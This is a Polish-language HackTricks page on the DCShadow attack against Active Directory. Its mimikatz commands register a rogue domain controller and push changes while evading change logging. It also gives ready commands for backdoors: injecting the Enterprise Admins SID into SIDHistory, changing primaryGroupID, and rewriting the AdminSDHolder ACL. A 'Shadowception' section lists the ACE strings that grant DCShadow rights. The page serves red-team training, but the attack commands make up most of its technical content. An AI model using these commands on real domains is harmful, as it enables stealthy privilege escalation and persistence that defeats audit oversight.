{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

Rejestruje **nowy kontroler domeny** w AD i używa go do **wypychania atrybutów** (SIDHistory, SPNs...) na określonych obiektach **bez** pozostawiania jakichkolwiek **logów** dotyczących **zmian**. Musisz mieć uprawnienia **DA** i być w **domenie głównej**.\
Zauważ, że jeśli użyjesz błędnych danych, pojawią się dość brzydkie logi.

Aby przeprowadzić atak, potrzebujesz 2 instancji mimikatz. Jedna z nich uruchomi serwery RPC z uprawnieniami SYSTEM (musisz tutaj wskazać zmiany, które chcesz wprowadzić), a druga instancja będzie używana do wypychania wartości:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Wymaga DA lub podobnego" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Zauważ, że **`elevate::token`** nie zadziała w sesji `mimikatz1`, ponieważ podnosi uprawnienia wątku, ale musimy podnieść **uprawnienia procesu**.\
Możesz również wybrać obiekt "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Możesz wprowadzić zmiany z konta DA lub z konta użytkownika z minimalnymi uprawnieniami:

* W **obiekcie domeny**:
* _DS-Install-Replica_ (Dodaj/Usuń replikę w domenie)
* _DS-Replication-Manage-Topology_ (Zarządzaj topologią replikacji)
* _DS-Replication-Synchronize_ (Synchronizacja replikacji)
* Obiekt **Sites** (i jego dzieci) w **kontenerze konfiguracji**:
* _CreateChild i DeleteChild_
* Obiekt **komputera, który jest zarejestrowany jako DC**:
* _WriteProperty_ (Nie Write)
* Obiekt **docelowy**:
* _WriteProperty_ (Nie Write)

Możesz użyć [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), aby nadać te uprawnienia użytkownikowi bez uprawnień (zauważ, że pozostawi to pewne logi). To jest znacznie bardziej restrykcyjne niż posiadanie uprawnień DA.\
Na przykład: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Oznacza to, że nazwa użytkownika _**student1**_ po zalogowaniu na maszynie _**mcorp-student1**_ ma uprawnienia DCShadow do obiektu _**root1user**_.

## Używanie DCShadow do tworzenia backdoorów

{% code title="Ustawienie Enterprise Admins w SIDHistory dla użytkownika" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Zmień PrimaryGroupID (dodaj użytkownika do grupy Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modyfikacja ntSecurityDescriptor AdminSDHolder (przyznanie Pełnej Kontroli użytkownikowi)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Przyznaj uprawnienia DCShadow za pomocą DCShadow (bez zmodyfikowanych dzienników uprawnień)

Musimy dodać następujące ACE z SID naszego użytkownika na końcu:

* Na obiekcie domeny:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Na obiekcie komputera atakującego: `(A;;WP;;;UserSID)`
* Na obiekcie użytkownika docelowego: `(A;;WP;;;UserSID)`
* Na obiekcie Sites w kontenerze Configuration: `(A;CI;CCDC;;;UserSID)`

Aby uzyskać aktualny ACE obiektu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Zauważ, że w tym przypadku musisz wprowadzić **kilka zmian,** a nie tylko jedną. Tak więc, w **sesji mimikatz1** (serwer RPC) użyj parametru **`/stack` z każdą zmianą,** którą chcesz wprowadzić. W ten sposób będziesz musiał tylko **`/push`** raz, aby wykonać wszystkie zablokowane zmiany na serwerze rouge.

[**Więcej informacji o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
